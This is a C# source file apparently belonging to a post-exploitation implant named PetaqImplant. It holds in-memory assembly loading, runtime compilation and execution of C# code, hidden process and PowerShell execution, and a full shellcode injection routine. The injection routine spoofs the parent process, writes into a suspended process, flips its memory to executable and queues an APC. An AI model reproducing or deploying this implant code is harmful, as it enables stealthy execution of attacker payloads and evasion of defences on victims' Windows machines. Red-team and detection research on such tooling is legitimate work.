using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.CSharp;
using System.CodeDom;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Management.Automation.Host;

namespace PetaqImplant
{
    public class Capabilities
    {
        
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;
        //private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;


        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum ProcessCreationFlags : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }        

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
            int dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
             Int32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
         ProcessAccessFlags processAccess,
         bool bInheritHandle,
         int processId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        public static extern uint SuspendThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }

        [Flags]
        public enum BinarySignaturePolicy : ulong
        {
            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
            BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x300000000000
        }

        public static bool CheckWin()
        {
            bool _isWindows;
            string windir = Environment.GetEnvironmentVariable("windir");
            if (!string.IsNullOrEmpty(windir) && windir.Contains(@"\") && Directory.Exists(windir))
            {
                _isWindows = true;
            }
            else
            {
                _isWindows = false;
            }
            return _isWindows;
        }

        public static void ExecSharpAssembly(byte[] sharpassembly, string[] arguments, bool wait = true)
        {
            Assembly a = Assembly.Load(sharpassembly);
            MethodInfo method = a.EntryPoint;
            object o = a.CreateInstance(method.Name);

                       
            if (wait)
            {
                //Console.WriteLine("I wait for the assembly to finish...");
                if (arguments == null || arguments.Length == 0)
                {
                    method.Invoke(o, null);
                }
                else
                {
                    object[] ao = { arguments };
                    method.Invoke(o, ao);
                }               

            }
            else
            {
                //Console.WriteLine("I don't wait for the assembly to finish...");
                // start as a thread if not waiting
                ThreadStart ths;
                if (arguments.Length == 0)
                {
                    ths = new ThreadStart(() => method.Invoke(o, null));
                }
                else
                {
                    object[] ao = { arguments };
                    ths = new ThreadStart(() => method.Invoke(o, ao));
                }

                Thread th = new Thread(ths);
                th.Start();
            }

            return;
        }
        public static void ExecSharpCode(string sharpcode, string[] arguments , bool wait = true)
        {
            // Not available in .NET Core
            //Console.WriteLine("Not available in .NET Core version");

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = true;
            parameters.IncludeDebugInformation = false;
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, sharpcode);
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();

                foreach (CompilerError error in results.Errors)
                {
                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
                }

                throw new InvalidOperationException(sb.ToString());
            }
            Assembly a = results.CompiledAssembly;

            MethodInfo method = a.EntryPoint;
            object o = a.CreateInstance(method.Name);

            if (wait)
            {
                //Console.WriteLine("I wait for the assembly to finish...");
                if (arguments.Length == 0)
                {
                    method.Invoke(o, null);
                }
                else
                {
                    object[] ao = { arguments };
                    method.Invoke(o, ao);
                }

            }
            else
            {
                //Console.WriteLine("I don't wait for the assembly to finish...");
                // start as a thread if not waiting
                ThreadStart ths;
                if (arguments == null || arguments.Length == 0)
                {
                    ths = new ThreadStart(() => method.Invoke(o, null));
                }
                else
                {
                    object[] ao = { arguments };
                    ths = new ThreadStart(() => method.Invoke(o, ao));
                }

                Thread th = new Thread(ths);
                th.Start();
            }

            return;
        }
        public static void Exec(string filename, string arguments, bool wait = true)
        {
            string output = "";
            //RuntimeInformation.IsOSPlatform(OSPlatform.Windows) isn't
            //available on .NET Framework, but only .NET Core
            // TODO : Initiate EXECs as separate process
            // TODO : Add IO to the Channels when implemented
            // TODO : Check the process hang or not
            if (CheckWin())                
            {
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();

                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = filename;
                startInfo.Arguments = arguments;

                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                process.StartInfo = startInfo;
                
                if (wait)
                {
                    //Console.WriteLine("Waiting for the process to complete...");
                    process.Start();
                    output = process.StandardOutput.ReadToEnd();
                    string err = process.StandardError.ReadToEnd();
                    if (err.Length > 0) { Console.WriteLine(err); }
                    process.WaitForExit();
                    Console.WriteLine(output);
                }
                else
                {
                    //Console.WriteLine("The process started as a thread.");
                    // start as a thread if not waiting
                    ThreadStart ths = new ThreadStart(() => process.Start());
                    Thread th = new Thread(ths);
                    th.Start();
                }

                
            }
            else
            {
                Console.WriteLine(output);

            }
        }

        public static void ExecPowershellAutomation(string pscontent, string[] arguments, bool wait = true)
        {
            // create Runspace and Pipeline
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            Pipeline pipeline = runspace.CreatePipeline();

            // include the powershell script given
            pipeline.Commands.AddScript(pscontent);

            // add additional commands if given
            pipeline.Commands.AddScript(String.Join(" ",arguments));


            // invoke the pipeline and collect the output
            System.Collections.ObjectModel.Collection<PSObject> output = pipeline.Invoke();
            runspace.Close();

            // convert the output to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in output)
            {
                stringBuilder.AppendLine(obj.ToString());
            }

            // send it to the c2 channel
            Console.WriteLine(stringBuilder.ToString());
        }


        public static void ExecShellcode(byte[] shellcode, string arch)
        {

            Console.WriteLine("Setting the startup information for the process to inject.");

            // Target process to inject into
            string processpath = Program.configuration["PROCESS_TO_CREATESUSPENDED"];
            STARTUPINFOEX si = new STARTUPINFOEX();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            si.StartupInfo.cb = (uint)Marshal.SizeOf(si);

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);


            var processSecurity = new SECURITY_ATTRIBUTES();
            var threadSecurity = new SECURITY_ATTRIBUTES();
            processSecurity.nLength = Marshal.SizeOf(processSecurity);
            threadSecurity.nLength = Marshal.SizeOf(threadSecurity);

            var lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, ref lpSize);

            Marshal.WriteIntPtr(lpValue, IntPtr.Zero);
            UpdateProcThreadAttribute(
                si.lpAttributeList,
                0,
                (IntPtr)ProcThreadAttribute.MITIGATION_POLICY,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
                );

            Console.WriteLine("Getting the parent process handle.");

            var parentHandle = Process.GetProcessesByName(Program.configuration["PROCESS_AS_PARENT"])[0].Handle;

            Console.WriteLine("Setting the parent process.");

            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, parentHandle);

            UpdateProcThreadAttribute(
                si.lpAttributeList,
                0,
                (IntPtr)ProcThreadAttribute.PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
                );

            Console.WriteLine("Creating the process in suspended state.");

            // Create new process in suspended state to inject into
            bool success = CreateProcess(processpath, null,
                ref processSecurity, ref threadSecurity,
                false,
                ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | ProcessCreationFlags.CREATE_SUSPENDED,
                IntPtr.Zero, null, ref si, out pi);


            Console.WriteLine("Allocating the memory with RW.");

            // Allocate memory within process and write shellcode
            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;


            Console.WriteLine("Pushing the payload to the process memory.");

            WriteProcessMemory(pi.hProcess, resultPtr, shellcode, shellcode.Length, out bytesWritten);

            // Open thread
            IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            uint oldProtect = 0;

            Console.WriteLine("Changing the memory permissions to RX.");

            // Modify memory permissions on allocated shellcode
            VirtualProtectEx(pi.hProcess, resultPtr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

            Console.WriteLine("Calling the QueueUserAPC.");

            // Assign address of shellcode to the target thread apc queue
            IntPtr ptr = QueueUserAPC(resultPtr, sht, IntPtr.Zero);

            Console.WriteLine("Resuming the thread.");

            IntPtr ThreadHandle = pi.hThread;
            ResumeThread(ThreadHandle);

            Console.WriteLine("The process is running with the payload injected.");


        }

    }
}
